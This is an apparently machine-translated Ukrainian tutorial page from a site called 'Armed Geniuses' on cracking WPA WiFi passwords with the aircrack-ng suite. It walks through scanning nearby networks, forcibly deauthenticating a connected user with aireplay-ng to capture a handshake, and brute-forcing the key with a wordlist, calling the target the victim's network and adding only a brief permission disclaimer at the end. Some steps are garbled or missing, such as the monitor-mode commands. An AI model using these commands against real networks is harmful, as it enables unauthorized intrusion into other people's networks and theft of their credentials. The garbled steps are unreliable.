Ласкаво просимо до Armed Geniuses

Тут ми поговоримо про базове тестування злому та проникнення. Ти можеш виберіть один із типів хаків нижче.

Злом Wi-Fi за допомогою Aircrack-ng

Вам знадобиться kali linux або будь-який інший дистрибутив Linux зі спеціальними інструментами встановлено. Для kali linux натисніть посилання нижче. Вам також знадобиться адаптер WiFi, сумісний з kali-linux, для режиму монітора та перехоплення/введення пакетів.

Як встановити пакунки

Відкрийте вікно терміналу та встановіть пакет, якщо його не встановлено.
Якщо ви використовуєте Debian або дистрибутив на основі Debian, тип:

apt update && apt install aircrack-ng

Якщо ви користуєтеся Arch Linux (ви чудові), тоді використовуйте pacman для встановлення інструментів. pacman -S aircrack



Сканування області


Тепер, коли інструменти встановлено, підключіть адаптер WiFi для режиму монітора.
Тепер введіть, ifconfig
wlan0: flags=4163 [UP,BROADCAST,RUNNING,MULTICAST] mtu 1500
inet ***.***.*.* маска мережі ***.***.***.* трансляція ***.***.*.***
inet6 ****::****:****:****:**** prefixlen 64 scopeid 0x20[посилання]
ether 00:11:22:33:44:55 txqueuelen 1000 (Ethernet)
Пакети RX 14976 байт 11406315 (10,8 МіБ)
Помилки RX 0 вилучено 0 переповнення 0 кадр 0
Пакети TX 9568 байтів 1148202 (1,0 МіБ)
Помилки TX 0 викинуто 0 переповнень 0 несучої 0 колізій 0 Ваш результат виглядатиме приблизно так, як наведено вище. Тепер ти доведеться перевести адаптер у режим монітора. Для мене, бездротовий адаптер - "wlan0". Отже тип:
ifconfig wlan0 does not work
iwconfig iwconfig wlan0
ifconfig wlan0 up Тепер ми проскануємо вашу область за допомогою інструменту під назвою airodump-ng. тип: airodump-ng wlan0 Тепер ви побачите всі різні мережі WiFi навколо вас. Після того, як ви отримаєте бажану мережу перевіряти, натисніть Ctrl + C, щоб зупинити сканування. Запишіть BSSID і НОМЕР КАНАЛУ. теж.

Зйомка рукостискань і крекінг


Тепер ми на короткий час деаутентифікуємо користувача в мережі та отримаємо його знову підключили, зафіксувавши WPA-рукостискання, яке міститиме важливу інформацію паролі та облікові дані в ньому в зашифрованому форматі.
Тип: airodump-ng --bssid [захоплений wiif BSSID] --channel [захоплений НОМЕР КАНАЛУ] --write [ім'я файлу] wlan0 Тепер інструмент винюхає дані з вибраної мережі WiFi. Запишіть BSSID орієнтуватися на користувача скасувати автентифікацію на короткий проміжок часу.
Тепер запустіть інший термінал паралельно та введіть: aireplay-ng --deauth 4 -a [wifi BSSID] -c [цільовий BSSID] wlan0 Тепер через деякий час, коли користувач знову підключиться до мережі, ви отримаєте повідомлення про те, що WPA-рукостискання було зафіксовано.
Тепер ви можете вийти з процесів. Пам’ятайте про захоплений файл (розширення .cap) або виконавши нижче команди ls Тепер у вас буде список слів для підбору загальних паролів, які використовуються для ключа.
Якщо у вас ще немає списку слів, ви можете завантажити його за допомогою кнопки нижче.



Тепер у нас є всі необхідні ресурси. Ми можемо почати брутфорс.
Важливо пам'ятати, що ймовірність того, що пароль буде зламаний, визначається за тим, наскільки поширеним і наскільки легко вгадати пароль. Завантажений список слів містить їх, але може містити не всі паролі. Якщо ви хочете застосувати агресивний підхід до злому, Я пропоную вам завантажити власний список слів або створити власний.

Повертаючись до нашого протоколу, тепер у нас є файл .cap і список деяких паролів. ми може почати брутфорс.
Для брутфорсу ми використаємо інструмент під назвою aircrack-ng. тип: aircrack-ng [ім'я файлу].cap -w [каталог списку слів].txt Тепер, якщо вам пощастить, можливо, ви успішно зламали мережу жертв. Знову як нагадування, будь ласка, протестуйте наведений вище метод ЯКЩО У ВАС МАЄ ДОЗВІЛ на зроби так. Ми не несемо відповідальності за наслідки.
